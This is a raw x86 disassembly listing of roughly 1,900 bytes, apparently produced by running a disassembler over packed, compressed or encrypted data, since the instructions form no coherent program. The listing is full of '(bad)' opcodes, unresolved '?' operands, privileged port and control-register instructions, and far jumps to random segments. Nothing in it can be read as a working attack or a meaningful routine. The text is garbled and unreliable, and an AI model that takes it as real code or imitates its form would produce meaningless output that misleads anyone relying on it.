  40faf0:	xchg   ecx,eax
  40faf1:	stos   BYTE PTR es:[edi],al
  40faf2:	xchg   edx,eax
  40faf3:	call   0x795a:0x15e86ada
  40fafa:	lods   al,BYTE PTR ds:[esi]
  40fafb:	icebp  
  40fafc:	mov    esi,gs
  40fafe:	repz add al,0x56
  40fb01:	sbb    dl,ah
  40fb03:	jecxz  0x40fb0c
  40fb05:	xor    eax,0x22985fd3
  40fb0a:	and    esi,DWORD PTR [ebx-0x5da5d57e]
  40fb10:	or     bh,BYTE PTR [edi+0x7e634033]
  40fb16:	cwde   
  40fb17:	mov    ?,esp
  40fb19:	dec    esi
  40fb1a:	cwde   
  40fb1b:	pop    ebp
  40fb1c:	fidiv  DWORD PTR [esi+0x44]
  40fb1f:	iret   
  40fb20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb21:	jmp    0x40fadb
  40fb23:	bound  edx,QWORD PTR [edx]
  40fb25:	rol    DWORD PTR [ecx],0xe1
  40fb28:	cld    
  40fb29:	fbld   TBYTE PTR [eax-0x31908c96]
  40fb2f:	in     eax,dx
  40fb30:	add    DWORD PTR [ecx+0x37fa3432],edi
  40fb36:	out    0x7f,eax
  40fb38:	adc    eax,0x4a6bce68
  40fb3d:	push   DWORD PTR [edi]
  40fb3f:	xchg   DWORD PTR [esi],edx
  40fb41:	xchg   ebx,eax
  40fb42:	pop    ds
  40fb43:	int    0x3b
  40fb45:	sbb    ax,0x4f10
  40fb49:	aad    0x63
  40fb4b:	out    0xc1,al
  40fb4d:	and    cl,ch
  40fb4f:	push   ebp
  40fb50:	and    dl,BYTE PTR [eax-0x65d81bac]
  40fb56:	(bad)  
  40fb57:	cmp    ebp,DWORD PTR [edx-0x38]
  40fb5a:	lods   al,BYTE PTR ds:[esi]
  40fb5b:	jno    0x40fbc2
  40fb5d:	xchg   esp,eax
  40fb5e:	jne    0x40fb64
  40fb60:	mov    dh,0x13
  40fb62:	(bad)  
  40fb64:	cmp    ebx,eax
  40fb66:	dec    eax
  40fb67:	jle    0x40fbb8
  40fb69:	inc    esi
  40fb6a:	aaa    
  40fb6b:	pop    ss
  40fb6c:	jmp    0x1f0daa79
  40fb71:	mov    BYTE PTR [eax],al
  40fb73:	sub    BYTE PTR [edx+0x7805e1f0],0x79
  40fb7a:	pop    edx
  40fb7b:	mov    cr2,eax
  40fb7e:	cmp    eax,0x2e0dc544
  40fb83:	mov    cs,WORD PTR [esi+0x79]
  40fb86:	cld    
  40fb87:	test   al,0x4f
  40fb89:	icebp  
  40fb8a:	sar    BYTE PTR [esi+0x44a38c37],1
  40fb90:	lahf   
  40fb91:	jb     0x40fb9d
  40fb93:	nop
  40fb94:	test   eax,0xfb020fbe
  40fb99:	mov    bl,0x7d
  40fb9b:	jmp    0x57b7a937
  40fba0:	jmp    0x32591924
  40fba5:	das    
  40fba6:	stos   BYTE PTR es:[edi],al
  40fba7:	xor    al,0x3f
  40fba9:	sub    DWORD PTR [edi-0x68],ecx
  40fbac:	cld    
  40fbad:	pop    ecx
  40fbae:	xor    DWORD PTR [eax-0x59f5c1f8],0x19
  40fbb5:	mov    ah,0x80
  40fbb7:	inc    edx
  40fbb8:	xor    BYTE PTR [eax],al
  40fbba:	mov    al,0x20
  40fbbc:	jmp    0xc1d56717
  40fbc1:	push   edi
  40fbc2:	pusha  
  40fbc3:	in     eax,0x3d
  40fbc5:	fisttp DWORD PTR [ebx]
  40fbc7:	pop    edi
  40fbc8:	mov    esp,0x286df8fd
  40fbcd:	std    
  40fbce:	and    BYTE PTR [edx],dl
  40fbd0:	cmp    al,0x17
  40fbd2:	in     eax,dx
  40fbd3:	iret   
  40fbd4:	push   ebp
  40fbd5:	mov    ebx,0x37460252
  40fbda:	cli    
  40fbdb:	and    DWORD PTR [ebx-0x4270b93a],eax
  40fbe1:	sbb    eax,0x7d3565d5
  40fbe6:	xchg   ebp,eax
  40fbe7:	add    bh,BYTE PTR [esi]
  40fbe9:	(bad)  
  40fbea:	std    
  40fbeb:	push   ecx
  40fbec:	gs pop ecx
  40fbee:	xlat   BYTE PTR ds:[ebx]
  40fbef:	daa    
  40fbf0:	pop    esp
  40fbf1:	xchg   BYTE PTR [esi+0x2cec33a7],al
  40fbf7:	lea    esp,[edx]
  40fbf9:	dec    edi
  40fbfa:	outs   dx,BYTE PTR ds:[esi]
  40fbfb:	mov    ah,0xea
  40fbfd:	sub    al,0x81
  40fbff:	arpl   WORD PTR [ebx-0x50],ax
  40fc02:	jo     0x40fb86
  40fc04:	mov    ebx,0x6e9cdd02
  40fc09:	dec    esp
  40fc0a:	aad    0x7e
  40fc0c:	cmp    BYTE PTR [edx-0x4f],al
  40fc0f:	aaa    
  40fc10:	push   esp
  40fc11:	ret    0xb121
  40fc14:	or     esi,ebx
  40fc16:	sbb    al,0x20
  40fc18:	mov    dl,0x13
  40fc1a:	test   DWORD PTR [esi+edi*8],ebx
  40fc1d:	pop    eax
  40fc1e:	or     BYTE PTR [edi-0x16985f8d],ch
  40fc24:	popa   
  40fc25:	je     0x40fc49
  40fc27:	imul   eax,ebx,0x256f9e2c
  40fc2d:	ds inc ebx
  40fc2f:	fs loop 0x40fc72
  40fc32:	inc    edx
  40fc33:	test   DWORD PTR [edi+0x3c9e6bc],0x672aa38d
  40fc3d:	or     BYTE PTR [esi],ah
  40fc3f:	je     0x40fc1f
  40fc41:	iret   
  40fc42:	icebp  
  40fc43:	dec    esp
  40fc44:	push   esp
  40fc45:	mov    ds,WORD PTR [ecx+0x329cf98a]
  40fc4b:	jl     0x40fc48
  40fc4d:	xchg   ebx,eax
  40fc4e:	pop    ebx
  40fc4f:	mov    esi,0xecfb1eb8
  40fc54:	xor    ch,ch
  40fc56:	xlat   BYTE PTR ds:[ebx]
  40fc57:	dec    esi
  40fc58:	xchg   edi,eax
  40fc59:	sbb    esi,eax
  40fc5b:	jmp    0xbb9b:0x35d290ee
  40fc62:	sub    DWORD PTR [ebp-0x1a04e978],0x6c4a9473
  40fc6c:	popa   
  40fc6d:	in     al,0x52
  40fc6f:	in     eax,dx
  40fc70:	int    0xb9
  40fc72:	push   edi
  40fc73:	aas    
  40fc74:	sbb    al,0x23
  40fc76:	add    al,0xbe
  40fc78:	dec    ebp
  40fc79:	aaa    
  40fc7a:	(bad)  
  40fc7b:	ins    BYTE PTR es:[edi],dx
  40fc7c:	cmp    bl,ah
  40fc7e:	je     0x40fcaf
  40fc80:	shr    DWORD PTR [esi+0x5a495a57],1
  40fc86:	mov    dh,0x67
  40fc88:	fwait
  40fc89:	daa    
  40fc8a:	dec    ebp
  40fc8b:	sbb    ebx,DWORD PTR [esi+0x7cd0d06]
  40fc91:	(bad)  
  40fc92:	aam    0x2
  40fc94:	adc    DWORD PTR [eax],ebx
  40fc96:	inc    edi
  40fc97:	cmp    DWORD PTR [ebp-0x48d7cfbb],eax
  40fc9d:	cmp    eax,0x4919e691
  40fca2:	inc    edx
  40fca3:	in     al,0xfa
  40fca5:	loopne 0x40fc7f
  40fca7:	in     eax,dx
  40fca8:	push   ecx
  40fca9:	sbb    al,0xb
  40fcab:	in     eax,0xe4
  40fcad:	test   eax,0xfc91c3f
  40fcb2:	pop    es
  40fcb3:	loope  0x40fd29
  40fcb5:	pop    es
  40fcb6:	int3   
  40fcb7:	(bad)  
  40fcb8:	cwde   
  40fcb9:	mov    al,ds:0x5bf3398d
  40fcbe:	fstp   TBYTE PTR [edi-0x4070f150]
  40fcc4:	or     esi,DWORD PTR [edi-0x1eebb850]
  40fcca:	xor    DWORD PTR [eax-0x6ecb7543],0x80ed72ee
  40fcd4:	retf   
  40fcd5:	loope  0x40fced
  40fcd7:	mov    bh,0x75
  40fcd9:	jp     0x40fcea
  40fcdb:	pop    esi
  40fcdc:	pop    ebp
  40fcdd:	inc    esi
  40fcde:	push   es
  40fcdf:	imul   ebp,DWORD PTR [ebx+eax*8],0xffffffcd
  40fce3:	es enter 0xb94e,0x9
  40fce8:	push   esp
  40fce9:	or     eax,0x78
  40fcec:	dec    ebp
  40fced:	mov    al,ds:0x66d051ed
  40fcf2:	add    eax,DWORD PTR [edi]
  40fcf4:	mov    WORD PTR [ecx],gs
  40fcf6:	ins    BYTE PTR es:[edi],dx
  40fcf7:	jp     0x40fca1
  40fcf9:	cmp    bh,bh
  40fcfb:	mov    DWORD PTR [eax],edi
  40fcfd:	adc    al,0x63
  40fcff:	enter  0xc38c,0x3a
  40fd03:	jae    0x40fd25
  40fd05:	js     0x40fcb1
  40fd07:	cmp    edi,DWORD PTR [ebp-0x74da46fd]
  40fd0d:	repnz push 0x3dbf404d
  40fd13:	cmp    esi,edx
  40fd15:	ins    DWORD PTR es:[edi],dx
  40fd16:	test   DWORD PTR [edx],0xdfec74a4
  40fd1c:	xor    eax,0x6eafe15d
  40fd21:	push   ebp
  40fd22:	push   eax
  40fd23:	mov    ebx,0x90ae773
  40fd28:	js     0x40fd0e
  40fd2a:	add    ah,al
  40fd2c:	arpl   si,sp
  40fd2e:	je     0x40fcc8
  40fd30:	or     BYTE PTR [eax+eiz*4-0x7e6ad564],0xaa
  40fd38:	adc    cl,BYTE PTR es:[ebx+0x18d6fb03]
  40fd3f:	das    
  40fd40:	xcrypt-ctr (bad)
  40fd41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd42:	sahf   
  40fd43:	in     eax,dx
  40fd44:	adc    eax,0xec0c65a6
  40fd49:	call   FWORD PTR ds:0x98a7e4
  40fd4f:	addr16 jmp 0xdb8ee5fd
  40fd55:	pop    eax
  40fd56:	dec    esi
  40fd57:	lds    esi,FWORD PTR [edx+0x734e7073]
  40fd5d:	inc    edi
  40fd5e:	push   esp
  40fd5f:	dec    edx
  40fd60:	sar    ebp,0x5
  40fd63:	inc    ebp
  40fd64:	(bad)  
  40fd65:	loop   0x40fcf1
  40fd67:	add    ebx,DWORD PTR [esi-0x2e]
  40fd6a:	shl    BYTE PTR [ecx],cl
  40fd6c:	sar    ch,1
  40fd6e:	or     ebx,ebp
  40fd70:	jge    0x40fd34
  40fd72:	mov    ds:0x2d18b9f1,eax
  40fd77:	adc    al,0x86
  40fd79:	jne    0x40fdd6
  40fd7b:	js     0x40fd96
  40fd7d:	leave  
  40fd7e:	xlat   BYTE PTR ds:[ebx]
  40fd7f:	mov    DWORD PTR [ecx+eax*4-0x26],ecx
  40fd83:	adc    al,0x90
  40fd85:	or     al,0x74
  40fd87:	clc    
  40fd88:	rcr    BYTE PTR [eax+0x46],0x20
  40fd8c:	and    esp,DWORD PTR [edi-0xe]
  40fd8f:	cdq    
  40fd90:	pop    ebx
  40fd91:	clc    
  40fd92:	sbb    esp,ebp
  40fd94:	jg     0x35fff8be
  40fd9a:	cmp    eax,0x2913baec
  40fd9f:	out    0x8c,eax
  40fda1:	mov    al,ds:0x36c3bcd6
  40fda6:	xor    BYTE PTR [esi],ch
  40fda8:	test   BYTE PTR [esi+0x33],bh
  40fdab:	inc    ebx
  40fdac:	adc    al,0xd3
  40fdae:	ins    BYTE PTR es:[edi],dx
  40fdaf:	leave  
  40fdb0:	add    DWORD PTR [ebp-0x70],edx
  40fdb3:	jmp    0xe24b:0xce390604
  40fdba:	loopne 0x40fe37
  40fdbc:	ins    DWORD PTR es:[edi],dx
  40fdbd:	xor    BYTE PTR [ecx],dh
  40fdbf:	mov    ch,0xf4
  40fdc1:	mov    al,0xf4
  40fdc3:	and    al,0x65
  40fdc5:	cdq    
  40fdc6:	cdq    
  40fdc7:	icebp  
  40fdc8:	bound  esp,QWORD PTR [edx+0x8]
  40fdcb:	in     al,dx
  40fdcc:	pop    edi
  40fdcd:	stc    
  40fdce:	test   al,0xf6
  40fdd0:	jae    0x40fe4e
  40fdd2:	es push edi
  40fdd4:	xchg   ebp,eax
  40fdd5:	push   edx
  40fdd6:	cli    
  40fdd7:	pop    eax
  40fdd8:	sub    eax,0xf090bcbe
  40fddd:	es pop edx
  40fddf:	sub    eax,0x15b06265
  40fde4:	gs sbb eax,esi
  40fde7:	aaa    
  40fde8:	repnz hlt 
  40fdea:	aad    0xd6
  40fdec:	(bad)  [ecx-0x47d4d17c]
  40fdf2:	retf   
  40fdf3:	arpl   WORD PTR [ebx+0x11],si
  40fdf6:	mov    eax,ds:0x1637249c
  40fdfb:	xor    eax,0xa087102d
  40fe00:	jmp    0x40fe02
  40fe02:	out    dx,al
  40fe03:	pop    eax
  40fe04:	sti    
  40fe05:	imul   esp,DWORD PTR [edx+0x5561b32],0x72
  40fe0c:	and    eax,0x34a93950
  40fe11:	and    BYTE PTR [edx-0x22],bl
  40fe14:	sub    eax,0x68076ef5
  40fe19:	in     eax,0x56
  40fe1b:	push   ds
  40fe1c:	jl     0x40fe5b
  40fe1e:	fcmovne st,st(4)
  40fe20:	lahf   
  40fe21:	mov    edx,0xdf56cf3
  40fe26:	mov    ah,0xf7
  40fe28:	ins    DWORD PTR es:[edi],dx
  40fe29:	xor    al,0x47
  40fe2b:	das    
  40fe2c:	jge    0x40fe25
  40fe2e:	xchg   DWORD PTR [ebp+0x5c],eax
  40fe31:	out    0x35,al
  40fe33:	fistp  WORD PTR [ebx-0x169b6333]
  40fe39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe3a:	js     0x40feb4
  40fe3c:	aad    0x16
  40fe3e:	std    
  40fe3f:	jge    0x40fe83
  40fe41:	std    
  40fe42:	aaa    
  40fe43:	out    dx,eax
  40fe44:	cmc    
  40fe45:	fldcw  WORD PTR [ecx-0x2abde856]
  40fe4b:	jnp    0x40fe14
  40fe4d:	lods   al,BYTE PTR ds:[esi]
  40fe4e:	sbb    esp,edx
  40fe50:	jle    0x40feb7
  40fe52:	pop    edx
  40fe53:	ficom  DWORD PTR [esi]
  40fe55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe56:	mov    ebp,0x2f5ab904
  40fe5b:	or     cl,BYTE PTR [edx]
  40fe5d:	sti    
  40fe5e:	cmp    DWORD PTR [ecx-0x3a],edx
  40fe61:	mov    ebp,0xf8ad6589
  40fe66:	loop   0x40fec6
  40fe68:	jecxz  0x40fe96
  40fe6a:	jg     0x40fe56
  40fe6c:	repnz mov ds:0x2d3ab885,eax
  40fe72:	stos   DWORD PTR es:[edi],eax
  40fe73:	or     cl,BYTE PTR [ecx]
  40fe75:	cmc    
  40fe76:	iret   
  40fe77:	adc    ah,BYTE PTR [esi]
  40fe79:	mov    ecx,0xb6fd6c0f
  40fe7e:	lock es add eax,0xbcf2932e
  40fe85:	and    al,dl
  40fe87:	mov    esp,0xf1b8f7fd
  40fe8c:	mov    ss,WORD PTR [eax]
  40fe8e:	hlt    
  40fe8f:	cwde   
  40fe90:	sbb    ecx,DWORD PTR [eax+ebx*4+0x4d]
  40fe94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe95:	in     al,0x1c
  40fe97:	test   eax,0xca3ced5
  40fe9c:	ror    BYTE PTR [ebx-0x4a],1
  40fe9f:	cli    
  40fea0:	pushf  
  40fea1:	mov    dh,0x78
  40fea3:	jg     0x40feec
  40fea5:	shl    BYTE PTR [ebx-0x16],cl
  40fea8:	cwde   
  40fea9:	sbb    ch,BYTE PTR [edi]
  40feab:	sbb    al,0x3b
  40fead:	push   ds
  40feae:	fsub   st,st(6)
  40feb0:	or     al,0x85
  40feb2:	inc    eax
  40feb3:	in     al,0xca
  40feb5:	jge    0x40fe64
  40feb7:	cmp    BYTE PTR [ebx+0x3bde257],dh
  40febd:	std    
  40febe:	mov    ch,0x67
  40fec0:	sub    BYTE PTR [edi],cl
  40fec2:	jo     0x40ff07
  40fec4:	div    ecx
  40fec6:	xchg   ebx,eax
  40fec7:	sahf   
  40fec8:	push   esi
  40fec9:	inc    ecx
  40feca:	setnp  BYTE PTR [edi+0x269a4966]
  40fed1:	les    eax,FWORD PTR [edx+edx*1+0x10d94a5d]
  40fed8:	dec    eax
  40fed9:	adc    eax,0x27f9878e
  40fede:	(bad)  
  40fedf:	out    dx,eax
  40fee0:	scas   al,BYTE PTR es:[edi]
  40fee1:	lock and ebx,DWORD PTR [esi-0x10]
  40fee5:	(bad)
  40fee8:	push   esp
  40fee9:	gs daa 
  40feeb:	and    DWORD PTR [ebx+0x6dec65a9],esi
  40fef1:	and    ebx,DWORD PTR [esi]
  40fef3:	cwde   
  40fef4:	std    
  40fef5:	sbb    DWORD PTR [edi+0x5ca51cbc],esi
  40fefb:	bound  esi,QWORD PTR [edx]
  40fefd:	jne    0x40feac
  40feff:	jl     0x40feed
  40ff01:	inc    ecx
  40ff02:	add    eax,0xc6e9fceb
  40ff07:	and    DWORD PTR [ebx+esi*1+0x2eade4d5],ebp
  40ff0e:	add    eax,esp
  40ff10:	in     al,0x45
  40ff12:	retf   0xdbb3
  40ff15:	adc    esi,eax
  40ff17:	mov    ds,WORD PTR [eax]
  40ff19:	(bad)  
  40ff1b:	push   esi
  40ff1c:	clc    
  40ff1d:	out    dx,al
  40ff1e:	xchg   BYTE PTR [edi*1-0x7ebd0533],al
  40ff25:	push   ss
  40ff26:	xor    BYTE PTR [ebp+ecx*4+0xe479373],cl
  40ff2d:	push   esi
  40ff2e:	in     al,0xf9
  40ff30:	xchg   edx,eax
  40ff31:	mov    ecx,0xd3cfc3b3
  40ff36:	dec    ebp
  40ff37:	dec    edx
  40ff38:	mov    esp,0x17391aa6
  40ff3d:	(bad)  
  40ff3e:	(bad)  
  40ff3f:	ds and eax,0x871a36f9
  40ff45:	scas   eax,DWORD PTR es:[edi]
  40ff46:	test   al,0x26
  40ff48:	ret    0x4a08
  40ff4b:	in     al,dx
  40ff4c:	jl     0x40ff76
  40ff4e:	jb     0x40ffbd
  40ff50:	mov    bl,0xde
  40ff52:	jns    0x40ff54
  40ff54:	les    esp,FWORD PTR [edx+0x604b473b]
  40ff5a:	loop   0x40fef9
  40ff5c:	add    eax,0xf02454d3
  40ff61:	and    bh,BYTE PTR [esi]
  40ff63:	push   ebx
  40ff64:	xchg   esp,eax
  40ff65:	sbb    edx,ebx
  40ff67:	pop    es
  40ff68:	pop    es
  40ff69:	(bad)  
  40ff6a:	mov    ebx,0x21a6a8aa
  40ff6f:	jb     0x40ff72
  40ff71:	retf   
  40ff72:	adc    ch,dh
  40ff74:	jne    0x40ff5c
  40ff76:	gs or  eax,0xc305dbc4
  40ff7c:	cld    
  40ff7d:	cmp    bh,BYTE PTR [edx]
  40ff7f:	lea    ecx,[ecx+0x28]
  40ff82:	push   ebx
  40ff83:	fisttp DWORD PTR [ecx-0x3fb8671f]
  40ff89:	stos   DWORD PTR es:[edi],eax
  40ff8a:	pop    es
  40ff8b:	repz arpl WORD PTR [eax-0x63f8cba4],cx
  40ff92:	stc    
  40ff93:	std    
  40ff94:	ds jo  0x40ffe8
  40ff97:	mov    cl,0xd6
  40ff99:	push   0x53
  40ff9b:	repz mov esp,0x87dd6f3e
  40ffa1:	icebp  
  40ffa2:	mov    dh,ch
  40ffa4:	in     al,dx
  40ffa5:	xor    eax,0xf8f18d99
  40ffaa:	lds    edx,FWORD PTR [eax+eax*4]
  40ffad:	(bad)  
  40ffae:	mov    esp,0x43386ddf
  40ffb3:	cmp    al,0x48
  40ffb5:	arpl   WORD PTR [esi],si
  40ffb7:	xchg   BYTE PTR [eax+0xbd1ceb0],ah
  40ffbd:	push   0x35
  40ffbf:	fdivr  DWORD PTR [edi]
  40ffc1:	out    0x8b,al
  40ffc3:	push   0xffffff8a
  40ffc5:	push   ds
  40ffc6:	or     edi,DWORD PTR [esi]
  40ffc8:	inc    edi
  40ffc9:	mov    bh,0xc0
  40ffcb:	jbe    0x40ff8a
  40ffcd:	xchg   ebp,eax
  40ffce:	sub    BYTE PTR [ecx+eax*8-0x66],dl
  40ffd2:	push   esp
  40ffd3:	cdq    
  40ffd4:	les    eax,FWORD PTR [ebp-0x12]
  40ffd7:	xchg   BYTE PTR [ecx-0x27],bh
  40ffda:	iret   
  40ffdb:	mov    cs,ebp
  40ffdd:	clc    
  40ffde:	jo     0x40ffd4
  40ffe0:	jle    0x41000f
  40ffe2:	aad    0xcf
  40ffe4:	adc    esp,ebp
  40ffe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffe7:	and    BYTE PTR [edi-0x20],ah
  40ffea:	mov    ebx,0x9fd9fef3
  40ffef:	dec    ecx
  40fff0:	add    BYTE PTR [ebx+0x3],ch
  40fff3:	aaa    
  40fff4:	bnd jns 0x40ffda
  40fff7:	inc    edi
  40fff8:	jno    0x40ffe8
  40fffa:	jmp    0x4769:0xe702dc0e
  410001:	test   BYTE PTR [esi-0xbee8d79],bh
  410007:	pop    esi
  410008:	sbb    BYTE PTR [ecx],dh
  41000a:	sub    al,0xfb
  41000c:	popa   
  41000d:	cmp    eax,0x4895915a
  410012:	jne    0x40ff9b
  410014:	add    eax,0x3b7e9482
  410019:	mov    dh,0x3e
  41001b:	mov    WORD PTR [ecx-0x3c996cda],es
  410021:	lea    ebp,[edi-0xf]
  410024:	push   esi
  410025:	xchg   BYTE PTR [edx+0x1c],bh
  410028:	sti    
  410029:	retf   
  41002a:	(bad)  [edi-0x7753e235]
  410030:	jle    0x41008b
  410032:	and    al,0xd6
  410034:	push   edx
  410035:	sub    bh,BYTE PTR [edx-0x23]
  410038:	pop    ss
  410039:	shr    BYTE PTR [ebx-0x7a],0x55
  41003d:	add    eax,ecx
  41003f:	ror    DWORD PTR [eax-0x4a],cl
  410042:	fsubr  QWORD PTR [ebx-0x1761cbf7]
  410048:	push   ds
  410049:	mov    cl,0xe
  41004b:	sbb    eax,0x275502b7
  410050:	jl     0x4100b5
  410052:	and    al,0x6d
  410054:	daa    
  410055:	leave  
  410056:	fstp   DWORD PTR [edi-0x71]
  410059:	xchg   ecx,eax
  41005a:	jbe    0x410080
  41005c:	inc    esp
  41005d:	int    0xa4
  41005f:	push   ss
  410060:	into   
  410061:	mov    eax,ds:0x14c40b20
  410066:	mov    DWORD PTR [ebx-0x5d],0x5b15d966
  41006d:	jno    0x410096
  41006f:	out    0xf2,eax
  410071:	cwde   
  410072:	stos   DWORD PTR es:[edi],eax
  410073:	add    edx,DWORD PTR [ebp+0x2a]
  410076:	cmp    BYTE PTR [edx],bh
  410078:	push   0x24ec54ae
  41007d:	push   esp
  41007e:	mov    ebp,0xf1d570a5
  410083:	and    esp,eax
  410085:	dec    esp
  410086:	in     al,0x27
  410088:	pop    edi
  410089:	pop    eax
  41008a:	adc    BYTE PTR [esi-0x77],bh
  41008d:	lea    esi,[eax+0x44]
  410090:	sbb    esp,DWORD PTR [esi+0x2a]
  410093:	shl    DWORD PTR [ebx-0x77297c30],1
  410099:	pop    ds
  41009a:	mov    ah,BYTE PTR [eax]
  41009c:	add    eax,0x51797122
  4100a1:	add    al,0x62
  4100a3:	out    0x36,al
  4100a5:	std    
  4100a6:	mov    ebx,0xb6a1943f
  4100ab:	mov    bh,0x10
  4100ad:	into   
  4100ae:	sbb    BYTE PTR [eax-0x6c1b17d],0x45
  4100b5:	push   edx
  4100b6:	in     al,dx
  4100b7:	xlat   BYTE PTR ds:[ebx]
  4100b8:	jle    0x41005a
  4100ba:	iret   
  4100bb:	mov    eax,ds:0x57815485
  4100c0:	mov    cl,0xde
  4100c2:	cdq    
  4100c3:	cli    
  4100c4:	push   eax
  4100c5:	push   ds
  4100c6:	adc    al,0xfd
  4100c8:	mov    al,ds:0x4828e29a
  4100cd:	cdq    
  4100ce:	in     eax,dx
  4100cf:	bound  edx,QWORD PTR [ebp-0x6e]
  4100d2:	fist   WORD PTR [edi-0x3f]
  4100d5:	stos   DWORD PTR es:[edi],eax
  4100d6:	ret    0x4f22
  4100d9:	fistp  DWORD PTR [eax+ebx*4-0x66]
  4100dd:	add    al,0xf6
  4100df:	add    eax,0xa81200a2
  4100e4:	aad    0xb
  4100e6:	icebp  
  4100e7:	out    dx,al
  4100e8:	mov    ah,ch
  4100ea:	push   0xffffffd9
  4100ec:	ret    
  4100ed:	push   ebp
  4100ee:	add    BYTE PTR [edx],ch
  4100f0:	popa   
  4100f1:	push   eax
  4100f2:	fcom   DWORD PTR [eax]
  4100f4:	dec    bl
  4100f6:	fisubr WORD PTR [ecx]
  4100f8:	out    dx,al
  4100f9:	xchg   esi,eax
  4100fa:	jg     0x410173
  4100fc:	cmc    
  4100fd:	cmp    al,0xca
  4100ff:	out    dx,eax
  410100:	and    al,0x5d
  410102:	and    esi,DWORD PTR [esi]
  410104:	hlt    
  410105:	repz pop edi
  410107:	in     eax,dx
  410108:	mov    esi,0xcd31091e
  41010d:	and    ecx,DWORD PTR [esi-0x2c7a33e7]
  410113:	jmp    0xccac:0x643aec92
  41011a:	rcr    BYTE PTR [ecx+ecx*4+0x76],0x44
  41011f:	push   edi
  410120:	dec    esi
  410121:	or     dh,BYTE PTR cs:[edx]
  410124:	ftst   
  410126:	das    
  410127:	or     edi,DWORD PTR [ecx-0x297bc52b]
  41012d:	ds int3 
  41012f:	adc    al,0x3b
  410131:	sbb    eax,0xa06702f
  410136:	dec    edi
  410137:	(bad)
  41013a:	and    edi,ecx
  41013c:	push   ebp
  41013d:	adc    DWORD PTR [ecx-0x28a21cdd],edx
  410143:	out    dx,eax
  410144:	push   es
  410145:	jne    0x410177
  410147:	fxch   st(4)
  410149:	sbb    dh,BYTE PTR ds:0xe50de131
  41014f:	dec    ebx
  410150:	cmp    edi,DWORD PTR [esi+0x65]
  410153:	scas   eax,DWORD PTR es:[edi]
  410154:	push   cs
  410155:	jp     0x41014c
  410157:	mov    ds,WORD PTR [edi]
  410159:	(bad)  
  41015a:	fbstp  TBYTE PTR [edx-0x4248c3d0]
  410160:	adc    ebp,DWORD PTR [esi]
  410162:	js     0x410159
  410164:	jnp    0x410167
  410166:	mov    edi,0x36d64d5e
  41016b:	(bad)  
  41016c:	pop    edi
  41016d:	push   edi
  41016e:	fnsave [esi+0x4e]
  410171:	inc    ecx
  410172:	and    bl,bl
  410174:	stos   DWORD PTR es:[edi],eax
  410175:	ror    BYTE PTR [ebx],1
  410177:	sub    eax,0xeaf69a1c
  41017c:	popa   
  41017d:	and    DWORD PTR [ebx-0x56],ebp
  410180:	push   ebp
  410181:	xor    cl,BYTE PTR [esi-0x19a5edb1]
  410187:	loope  0x410126
  410189:	fimul  WORD PTR [ebp-0x685646de]
  41018f:	mov    ecx,0x9a59f07d
  410194:	mov    cl,0xc3
  410196:	loope  0x41020a
  410198:	clc    
  410199:	pop    ss
  41019a:	icebp  
  41019b:	ss mov eax,0xee79d496
  4101a1:	sbb    ecx,ebx
  4101a3:	cmp    eax,0x930a37d
  4101a8:	repz out 0x5a,al
  4101ab:	sti    
  4101ac:	or     eax,0xa0b561b4
  4101b1:	call   0xaaa7:0x133c963d
  4101b8:	jle    0x4101c6
  4101ba:	sub    eax,0x10686cf4
  4101bf:	mov    edi,0xdda2bc40
  4101c4:	addr16 data16 fcos 
  4101c8:	xor    DWORD PTR [eax+esi*1+0x36c5ddd3],ebp
  4101cf:	(bad)  
  4101d0:	repnz xlat BYTE PTR ds:[ebx]
  4101d2:	(bad)  
  4101d3:	pop    esp
  4101d4:	sub    al,0xcd
  4101d6:	ds aad 0x0
  4101d9:	stos   BYTE PTR es:[edi],al
  4101da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101db:	jns    0x410202
  4101dd:	jb     0x410242
  4101df:	dec    eax
  4101e0:	push   esi
  4101e1:	pushf  
  4101e2:	jne    0x4101f2
  4101e4:	sbb    ecx,DWORD PTR [edx+0x15]
  4101e7:	sbb    dh,BYTE PTR [ebx+0x59db937d]
  4101ed:	repz jecxz 0x4101cb
  4101f0:	ret    
  4101f1:	mov    ?,WORD PTR [esi+edi*2]
  4101f4:	sub    bh,BYTE PTR [esi+0x4b]
  4101f7:	cdq    
  4101f8:	dec    ecx
  4101f9:	lahf   
  4101fa:	dec    eax
  4101fb:	pop    es
  4101fc:	add    eax,0xc82e3c40
  410201:	stos   DWORD PTR es:[edi],eax
  410202:	test   DWORD PTR ds:0x85c7b444,ebp
  410208:	sub    al,0x90
  41020a:	es push edx
  41020c:	dec    ecx
  41020d:	mov    ds:0xe215dda1,al
  410212:	push   ecx
  410213:	rol    DWORD PTR [ebx-0x6e023092],0x45
  41021a:	iret   
  41021b:	add    dh,dh
  41021d:	div    DWORD PTR [esi]
  41021f:	mov    WORD PTR [esi-0x1b9d0f22],?
  410225:	pop    ss
  410226:	aas    
  410227:	push   ds
  410228:	add    BYTE PTR [edi-0x18],bh
  41022b:	xchg   esp,eax
  41022c:	pop    es
  41022d:	cld    
  41022e:	jg     0x41027d
  410230:	mov    cl,0x4d
  410232:	jge    0x4101cb
  410234:	jae    0x41027b
  410236:	sub    bl,BYTE PTR [ebx]
  410238:	icebp  
  410239:	mov    ebp,esi
  41023b:	pop    eax
  41023c:	jmp    DWORD PTR [ecx]
  41023e:	jmp    0x410238
  410240:	fild   QWORD PTR [ebp-0x76d484ba]
  410246:	rcl    esi,0x25
  410249:	inc    edx
  41024a:	adc    al,BYTE PTR [esi]
  41024c:	pop    esi
  41024d:	cli    
  41024e:	cs retf 
  410250:	js     0x410242
  410252:	pop    ebp
  410253:	enter  0x444e,0xf3
  410257:	sbb    ch,BYTE PTR [eax]
  410259:	stos   DWORD PTR es:[edi],eax
  41025a:	out    dx,al
  41025b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41025c:	xchg   BYTE PTR ds:0xb91aee21,ah
  410262:	pop    esi
  410263:	std    
  410264:	scas   eax,DWORD PTR es:[edi]
  410265:	jae    0x41023c
  410267:	or     ebp,DWORD PTR [ecx+0x5b]
  41026a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41026b:	scas   eax,DWORD PTR es:[edi]
  41026c:	aas    
